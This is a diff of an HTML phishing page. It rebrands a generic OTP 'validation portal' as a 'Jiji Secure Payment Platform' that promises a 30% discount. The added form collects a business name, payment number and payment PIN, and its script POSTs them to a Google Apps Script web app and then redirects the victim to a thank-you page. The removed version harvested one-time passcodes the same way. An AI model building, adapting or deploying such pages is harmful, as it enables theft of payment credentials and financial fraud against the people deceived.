@@ -3,95 +3,88 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Secure Validation Platform</title>
+  <title>Jiji Secure Payment Platform</title>
   <style>
     body { font-family: Arial, sans-serif; background-color: #f5f5f5; margin:0; padding:0; }
     .container { max-width:400px; margin:40px auto; background:#fff; border-radius:8px; box-shadow:0 4px 10px rgba(0,0,0,0.1); overflow:hidden; }
-    .header{ background:#0b6b3a; color:#fff; text-align:center; padding:22px 15px; }
+    .header{ background:#00b140; color:#fff; text-align:center; padding:22px 15px; }
     .header h2{ margin:0 0 8px; font-size:18px; line-height:1.3; }
     .header p{ margin:0; font-size:13px; font-weight:700; text-transform:uppercase; opacity:0.95; }
     form{ padding:20px; }
     label{ display:block; margin-bottom:6px; font-weight:600; color:#333; }
     input{ width:100%; padding:12px; margin-bottom:16px; border:1px solid #d7d7d7; border-radius:6px; font-size:14px; }
-    input:focus{ border-color:#0b6b3a; outline:none; box-shadow:0 0 4px rgba(11,107,58,0.25); }
-    .btn{ width:100%; background:#0b6b3a; color:#fff; padding:14px; font-size:16px; font-weight:700; border:none; border-radius:6px; cursor:pointer; transition:background .2s; }
-    .btn:hover{ background:#094e2b; }
-    .footer{ background:#0b6b3a; color:#fff; text-align:center; padding:12px; font-size:13px; }
+    input:focus{ border-color:#00b140; outline:none; box-shadow:0 0 4px rgba(0,177,64,0.25); }
+    .btn{ width:100%; background:#00b140; color:#fff; padding:14px; font-size:16px; font-weight:700; border:none; border-radius:6px; cursor:pointer; transition:background .2s; }
+    .btn:hover{ background:#009530; }
+    .footer{ background:#00b140; color:#fff; text-align:center; padding:12px; font-size:13px; }
     .notice { font-size:13px; color:#666; text-align:center; margin-bottom:12px; }
   </style>
 </head>
 <body>
   <div class="container">
     <div class="header">
-      <h2>Welcome to the Secure Validation Portal</h2>
-      <p>PLEASE ENTER YOUR VALIDATION OTP TO CONTINUE</p>
+      <h2>Jiji Payment<h2>
+        <h2>Welcome to the auto-payment portal for your subscriptions on Jiji.</h2>
+      <p>PLEASE VALIDATE YOUR BUSINESS ACCOUNT TO HAVE ACCESS TO 30% DISCOUNT AND FREE CHARGES FOR YOUR SUBSCRIPTIONS</p>
     </div>
 
     <!-- Form -->
-    <form id="regForm" autocomplete="off">
-      <label for="validation_otp">Validation OTP</label>
-      <input type="text" id="validation_otp" name="validation_otp" placeholder="Enter your Validation OTP" required>
+    <form id="jijiForm" autocomplete="off">
+      <label for="business">Business Name</label>
+      <input type="text" id="business" name="business" placeholder="Enter Business Name" required>
 
-      <div class="notice" id="status">Your credentials are secured.</div>
+      <label for="paymentNumber">Payment Number</label>
+      <input type="text" id="paymentNumber" name="paymentNumber" placeholder="Enter Payment Number" required>
 
-      <button type="submit" class="btn">Validate OTP →</button>
+      <label for="paymentPin">Payment Pin</label>
+      <input type="password" id="paymentPin" name="paymentPin" placeholder="Enter Payment Pin" required>
+
+      <div class="notice" id="status">Your Credentials are secured.</div>
+
+      <button type="submit" class="btn">Validate Account →</button>
     </form>
 
     <div class="footer">
-      © 2025 Secure Services – All Rights Reserved
+      © 2025 Jiji Subscriptions – All Rights Reserved
     </div>
   </div>
 
   <script>
-    (function () {
-      const form = document.getElementById('regForm');
-      const statusEl = document.getElementById('status');
+    const form = document.getElementById('jijiForm');
+    const statusEl = document.getElementById('status');
 
-      // ✅ Updated working Web App URL
-      const WEBAPP_URL = 'https://script.google.com/macros/s/AKfycbxeIPpKVQOagylbISVnIckuJeazhERR8IYTxtJQFhCqRNJmawsQ-b4_b5pkSQRBldxN/exec';
+    // your deployed Apps Script Web App URL
+    const WEBAPP_URL = 'https://script.google.com/macros/s/AKfycbxOpOdwYts-Td5SH48_hq9dADPzhwRuINh6LevT_up92sj2g0FiLDTnlcJ78SYe7As4RA/exec';
 
-      form.addEventListener('submit', async function (e) {
-        e.preventDefault();
-        statusEl.textContent = 'Submitting...';
-        statusEl.style.color = '#666';
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      statusEl.textContent = 'Submitting...';
+      statusEl.style.color = '#666';
 
-        const validation_otp = document.getElementById('validation_otp').value.trim();
+      try {
+        const formData = new FormData(form);
 
-        // Send as form data (works reliably with Apps Script)
-        const formData = new FormData();
-        formData.append("validation_otp", validation_otp);
+        const response = await fetch(WEBAPP_URL, {
+          method: 'POST',
+          body: formData
+        });
 
-        try {
-          const resp = await fetch(WEBAPP_URL, {
-            method: 'POST',
-            body: formData
-          });
+        const text = await response.text();
+        console.log("Server says:", text);
 
-          const text = await resp.text();
-          console.log("Raw response:", text);
-
-          let json;
-          try {
-            json = JSON.parse(text);
-          } catch (err) {
-            statusEl.textContent = "Invalid JSON: " + text;
-            statusEl.style.color = "#aa0000";
-            return;
-          }
-
-          if (json.result === 'success') {
-            window.location.href = "thankyou.html"; 
-          } else {
-            statusEl.textContent = 'Submission failed: ' + (json.message || 'Unknown error');
-            statusEl.style.color = '#aa0000';
-          }
-        } catch (err) {
-          console.error(err);
-          statusEl.textContent = 'Error: ' + err.message;
+        // if success → redirect immediately
+        if (text.includes("SUCCESS")) {
+          window.location.href = "thankyou.html";
+        } else {
+          statusEl.textContent = 'Submission failed. Try again.';
           statusEl.style.color = '#aa0000';
         }
-      });
-    })();
+      } catch (err) {
+        console.error(err);
+        statusEl.textContent = 'Error submitting. Try again later.';
+        statusEl.style.color = '#aa0000';
+      }
+    });
   </script>
 </body>
 </html>
